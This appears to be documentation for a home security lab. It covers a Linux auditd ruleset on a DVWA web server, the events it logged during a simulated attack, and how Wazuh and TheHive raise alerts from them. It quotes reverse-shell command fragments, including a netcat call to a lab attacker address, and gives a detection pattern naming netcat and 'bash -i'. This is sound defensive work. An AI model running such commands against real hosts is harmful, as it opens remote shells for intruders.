# Linux Auditd Baseline — Endpoint Kernel Telemetry

> **Configuration & Artifacts:**
> - Production Ruleset: [`audit.rules`](audit.rules)
> - Target Deployment: DVWA Web Server / Pivot Host (`192.168.56.30`, Ubuntu 24.04 LTS)
> - Ruleset Location: `/etc/audit/rules.d/audit.rules`
> - Wazuh Ingestion: Native Wazuh Auditd ruleset (`ruleset/rules/0365-auditd_rules.xml`) + Custom `local_rules.xml`

---

## 1. Overview & Operational Role

Linux Auditd provides kernel-level system call and file-system tracking via the netlink audit subsystem. In this lab, Auditd serves as the primary endpoint detection mechanism on the Linux web server (`192.168.56.30`), capturing post-exploitation activities, reverse shell spawns, binary execution, and file staging.

---

## 2. Empirically Verified Telemetry (`key="web_process_creation"`)

Analysis of [`06-Resources/Alerts/Wazuh-Raw-Alerts.csv`](../../06-Resources/Alerts/Wazuh-Raw-Alerts.csv) confirms that the primary active rule during simulation was:

```text
-a always,exit -F arch=b64 -S execve -F uid=33 -k web_process_creation
```

This rule monitors **all** binary execution system calls (`execve`) initiated by the `www-data` service account (`uid=33`) across the entire host, without path restriction. During simulation, commands spawned by the uploaded webshell and reverse shell executed with working directory `/var/www/html/dvwa/hackable/uploads`. In the raw alerts dataset, this rule generated **20 high-fidelity audit events** tracking adversary execution across Stages 05 and 06:

| Executed Binary | Working Directory | Observed Command Line / Arguments | Correlated Stage & Alert |
|---|---|---|---|
| `/usr/bin/id` | `/var/www/html/dvwa/hackable/uploads` | `id` | **Stage 05** (Web Shell: `wzb-61ed72e937`) |
| `/usr/bin/rm` | `/var/www/html/dvwa/hackable/uploads` | `rm /tmp/f` | **Stage 06** (Reverse Shell preparation) |
| `/usr/bin/cat` | `/var/www/html/dvwa/hackable/uploads` | `cat /tmp/f` | **Stage 06** (FIFO pipeline) |
| `/usr/bin/nc.openbsd` | `/var/www/html/dvwa/hackable/uploads` | `nc 192.168.232.135 4444` | **Stage 06** (Reverse Shell: `wzb-ccae331b77`) |
| `/usr/bin/python3` | `/var/www/html/dvwa/hackable/uploads` | `python3` interactive socket | **Stage 06** (Reverse Shell) |
| `/usr/bin/sed`, `/usr/bin/awk` | `/var/www/html/dvwa/hackable/uploads` | Text processing and enumeration | **Stage 06** |

---

## 3. Defense-in-Depth Rules Inventory

In addition to `web_process_creation`, [`audit.rules`](audit.rules) provides comprehensive host coverage across 5 functional areas:

| Audit Key | Monitored Action | Syscall / File Target | Defensive Purpose |
|---|---|---|---|
| `web_process_creation` | Web server command execution | `-S execve -F uid=33` | Catches web shell commands and reverse shell spawns |
| `process_execution` | General binary execution | `-S execve,execveat` | Traces process launch telemetry across all users |
| `priv_escalation` | Setuid/setgid execution | `-S setuid,setgid,setreuid,setregid` | Flags privilege level changes |
| `setuid_creation` | SUID bit modification | `-S chmod,fchmod -F a2&04000` | Detects backdoor binary creation (`chmod +s`) |
| `ssh_root_persistence` | SSH key persistence | `-w /root/.ssh -p wa` | Alerts on authorized_keys tampering (Stage 08) |
| `identity` | Account tampering | `-w /etc/passwd -p wa`, `-w /etc/shadow` | Detects unauthorized user account additions |
| `cat_sensitive_file` | Sensitive file reads | `-w /etc/passwd -p r`, `-w /etc/shadow` | Alerts on credential harvesting attempts |
| `sudoers_modification` | Sudo privilege tampering | `-w /etc/sudoers -p wa`, `-w /etc/sudoers.d/` | Alerts on sudoers policy tampering |
| `suspicious_exec_dir` | Directory execution | `-S execve -F dir=/tmp`, `-F dir=/opt` | Detects payloads executing out of `/tmp` or `/opt` |

---

## 4. Rule Lock Immutability (`-e 2`)

The baseline enforces `-e 2` as the final directive in `audit.rules`. This sets the audit system to **immutable mode**:
- Rules cannot be modified, deleted, or cleared via runtime tools (`auditctl -D` is rejected by the kernel).
- Any attempt to reload or clear rules via `augenrules --load` will fail with an error.
- Disabling the audit daemon or changing rules requires a complete operating system reboot.
- Prevents root-level adversaries or compromised services from silencing kernel auditing during active intrusions.

---

## 5. Wazuh Integration Mechanics

Wazuh ingests Linux audit logs via the built-in `auditd` decoder and processes them through a tiered rule hierarchy:
1. **Baseline Ingestion (Level 3):** Rule `100180` (`Auditd: process execution detected`) decodes general command executions. At Level 3, these events remain indexed in the Wazuh Indexer and CSV telemetry for forensic queries without triggering SOAR integration.
2. **Custom Elevation (Level 10):** Custom **Rule `100199`** in `local_rules.xml` matches high-risk commands (`whoami`, `id`, `nc`, `ncat`, `netcat`, `sudo -l`, `bash -i`) and elevates them to **Level 10**:
   ```xml
   <rule id="100199" level="10">
     <if_sid>80700</if_sid>
     <field name="audit.syscall">59</field>
     <match type="pcre2">comm="(whoami|id|nc|ncat|netcat)"|a0="sudo"[\s\S]*?a1="-l"|a0="bash"[\s\S]*?a1="-i"</match>
     <description>Auditd: blacklisted/suspicious command executed - $(audit.exe)</description>
     <group>blacklist_command,</group>
   </rule>
   ```
3. **SOAR Aggregation:** Reaching Level 10 allows these events to cross the `<level>8</level>` threshold in `ossec.conf`. The `thecustomhive` integration groups sibling executions sharing untracked parent PIDs into `process_fanout` incident alerts in TheHive 5 (e.g. `wzb-61ed72e937` and `wzb-ccae331b77`).
